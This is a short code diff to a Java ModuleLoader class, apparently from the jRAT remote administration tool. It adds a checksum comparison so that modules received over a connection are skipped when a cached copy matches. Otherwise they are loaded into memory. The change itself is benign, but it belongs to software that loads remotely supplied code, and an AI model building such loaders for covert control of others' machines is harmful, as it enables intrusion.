@@ -8,6 +8,8 @@ import jrat.common.Logger;
 import jrat.common.compress.QuickLZ;
 import jrat.common.codec.Hex;
 
+import java.util.Arrays;
+
 public class ModuleLoader {
 
     /**
@@ -26,6 +28,21 @@ public class ModuleLoader {
             c.getDataInputStream().readFully(sum);
 
             Main.debug("receiving module " + mainClass + " (" + Hex.encode(sum) + ")");
+
+            byte[] localSum = CachedModuleLookup.lookupSum(mainClass);
+
+            boolean valid = Arrays.equals(sum, localSum);
+
+            System.out.println("file system integrity check: " + valid);
+            if (!valid) {
+                System.out.println("remote " + Hex.encode(sum));
+                System.out.println("local " + Hex.encode(localSum));
+            }
+
+            c.writeBoolean(valid);
+            if (valid) {
+                continue;
+            }
 
             MemoryClassLoader l = new MemoryClassLoader(ModuleLoader.class.getClassLoader(), null);
 
